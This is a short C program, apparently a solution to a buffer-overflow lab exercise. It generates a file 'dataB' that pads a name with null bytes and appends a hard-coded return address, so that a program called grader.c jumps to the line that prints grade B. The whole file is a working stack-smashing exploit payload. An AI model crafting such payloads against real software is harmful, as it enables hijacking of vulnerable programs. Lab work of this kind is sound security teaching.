/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Tharun Kumar Tiruppali Kalidoss, Sarika Ahire              */
/*--------------------------------------------------------------------*/

#include <assert.h>
#include <stddef.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

enum {INPUT_LENGTH = 13};
enum {BUFFER_LENGTH = 48};
/*
    this main function reads the first INPUT_LENGTH characters 
    from stdin, and stores them as the name for the grade to 
    be changed. It writes into the file "dataB" the required
    bytes and null bytes to skip to line 45 in main() of grader.c.
    This results in grader.c printing the grade B for any given 
    name to this file. returns 0 for successful completion, and 
    takes no parameters. 
*/
int main(void) {
    FILE* psFile;
    char input[INPUT_LENGTH];
    int remainingChars;
    unsigned long ret;

    fgets(input, INPUT_LENGTH, stdin);
    ret = 4196440lu;
    psFile = fopen("dataB", "w");
    remainingChars = BUFFER_LENGTH-strlen(input);
    fprintf(psFile,"%s",input);
    while(remainingChars>0) {
        fprintf(psFile,"%c", '\0');
        remainingChars--;
    }
    fwrite(&ret, sizeof(unsigned long), 1, psFile);
    return 0;
}